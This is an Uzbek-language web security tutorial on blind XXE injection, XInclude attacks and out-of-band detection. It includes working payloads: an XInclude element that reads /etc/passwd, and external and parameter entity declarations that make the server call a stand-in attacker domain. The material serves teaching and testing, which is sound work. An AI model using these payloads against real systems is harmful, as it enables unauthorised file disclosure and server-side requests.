

Ko‘zdan yashiringan (blind) XXE zaifliklari
Ko‘plab XXE zaifliklari “ko‘zdan yashiringan” bo‘ladi. Bu — ilova tashqaridan ta’riflangan entitetlarning qiymatlarini javoblarida qaytarmaydi, shuning uchun serverdagi fayllarni to‘g‘ridan-to‘g‘ri o‘qib olish mumkin emasligini anglatadi.

Ko‘zdan yashiringan XXE zaifliklarini ham aniqlash va ekspluatatsiya qilish mumkin, lekin buning uchun yanada murakkab usullar kerak bo‘ladi. Ba’zida siz out-of-band texnikalaridan (masofaviy kanal orqali) foydalanib zaifliklarni topishingiz va ma’lumotlarni chiqarib olishingiz mumkin. Yana ba’zida XML parse qilinishida xatoliklarni qo‘zg‘atish mumkin, va shu xatolik xabarlari orqali maxfiy ma’lumotlarni oshkor qilish mumkin.

Batafsil o‘qish
Ko‘zdan yashiringan XXE zaifliklarini topish va ekspluatatsiya qilish

XXE injeksiyasi uchun yashirin hujum sathi topish
XXE injeksiyasi hujum sathi ko‘p hollarda oson aniqlanadi, chunki ilovaning oddiy HTTP trafikida XML formatidagi ma’lumotlarni o‘z ichiga olgan so‘rovlar mavjud bo‘ladi. Boshqa hollarda esa hujum sathi kamroq ko‘rinadi. Ammo, to‘g‘ri joylarni tekshirsangiz, XML bo‘lmagan so‘rovlarda ham XXE hujum sathi topishingiz mumkin.

XInclude hujumlari
Ba’zi ilovalar mijoz yuborgan ma’lumotni oladi, uni server tomonida XML hujjatiga joylaydi va so‘ng hujjatni parse qiladi. Misol uchun, mijoz yuborgan ma’lumot backenddagi SOAP so‘roviga joylashtirilsa va u xuddi shu tarzda qayta ishlansa — bunday vaziyatda klassik XXE hujumini amalga oshirish mushkul bo‘ladi, chunki siz butun XML hujjatni boshqara olmaysiz va DOCTYPE elementini qo‘shib yoki o‘zgartira olmaysiz. Biroq, XInclude yordamida hujum qilish imkoniyati bo‘lishi mumkin. XInclude — XML spetsifikatsiyasining bir qismi bo‘lib, u XML hujjatini kichik hujjatlardan birlashtirishga imkon beradi. Siz XInclude hujumini XML hujjatidagi istalgan ma’lumot maydoniga joylashtirishingiz mumkin, shuning uchun hujum siz faqatgina server tomonidagi XML hujjatiga joylashtiriladigan yagona ma’lumot elementini boshqarishingiz mumkin bo‘lgan vaziyatlarda ham amalga oshiriladi.

XInclude hujumini bajarish uchun siz XInclude namespace’ini ulashingiz va o‘qishni xohlagan fayl yo‘lini ko‘rsatishingiz kerak. Masalan:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

_________________________________________________________________________________________________________________________
Ko‘zdan yashiringan (blind) XXE ni out-of-band (OAST) texnikalari yordamida aniqlash
Ko‘pincha ko‘zdan yashiringan XXE ni aniqlash uchun XXE → SSRF hujumlarida ishlatiladigan usuldan foydalanish mumkin — ya’ni tarmoq orqali chetga (out-of-band) o‘z nazoratingiz ostidagi tizimga so‘rov yuborilishini qo‘zg‘ashingiz kerak. Masalan, tashqi entitetni quyidagicha e’lon qilishingiz mumkin:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

So‘ngra aniqlangan entitetni XML ichidagi ma’lumot qiymatida ishlatasiz.

Bu XXE hujumi serverni ko‘rsatilgan URL ga orqa tomondan HTTP so‘rov yuborishga majbur qiladi. Hujumchi DNS so‘rovi va HTTP so‘rovlarni kuzatib, shunday qilib XXE hujumi muvaffaqiyatli bo‘lganligini aniqlaydi.

Ba’zida oddiy entitetlar yordamida bajariladigan XXE hujumlari ilovaning kirish ma’lumotlarini tekshirish yoki ishlatilayotgan XML parserining qattiq sozlamalari tufayli bloklanishi mumkin. Bunday vaziyatda XML parametr entitetlaridan foydalanish mumkin. XML parametr entitetlari — DTD ichida faqat boshqa joylarda chaqirilishi mumkin bo‘lgan maxsus turdagi XML entitetlaridir. Hozircha sizga ikkita muhim jihatni bilish kifoya: birinchidan, XML parametr entitetini e’lon qilishda entitet nomidan avval foiz (%) belgisi ishlatiladi:

```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```

Ikkinchidan, parametr entitetlari odatdagi ampersand (&) o‘rniga foiz (%) belgisi bilan chaqiriladi:

```
%myparameterentity;
```

Demak, ko‘zdan yashiringan XXE ni XML parametr entitetlari orqali out-of-band usulda sinash mumkin, masalan:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

Ushbu XXE payload `xxe` nomli XML parametr entitetini e’lon qiladi va so‘ngra uni DTD ichida chaqiradi. Bu hujumchi domeniga DNS so‘rovi va HTTP so‘rov yuborilishiga olib keladi va shu tarzda hujumning muvaffaqiyati tasdiqlanadi.

